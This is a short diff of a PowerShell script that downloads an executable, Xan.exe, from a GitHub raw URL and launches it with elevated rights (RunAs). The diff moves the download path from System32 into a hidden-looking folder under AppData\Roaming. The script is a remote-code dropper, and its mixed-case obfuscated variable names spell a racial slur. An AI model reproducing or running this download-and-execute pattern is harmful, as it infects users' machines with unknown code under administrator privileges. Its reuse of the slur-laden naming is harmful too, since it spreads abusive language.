@@ -20,7 +20,7 @@ while ($WC.IsBusy) {
 }
 
 $NIGgEruRL = "https://github.com/RollbakIsOnline/Puls/raw/refs/heads/main/Xan.exe"
-$nigGeRpAth = "C:\Windows\System32\Windows.exe"
+$nigGeRpAth = "C:\Users\AppData\Roaming\SubDir\Xan.exe"
 
 $WC = New-Object System.Net.WebClient
 $WC.DownloadFileAsync($NIGgEruRL, $nigGeRpAth)
@@ -39,4 +39,5 @@ if (Test-Path $TuFfpaTh) {
 if (Test-Path $nigGeRpAth) {
      Start-Process $nigGeRpAth -Verb RunAs
 }
+
 
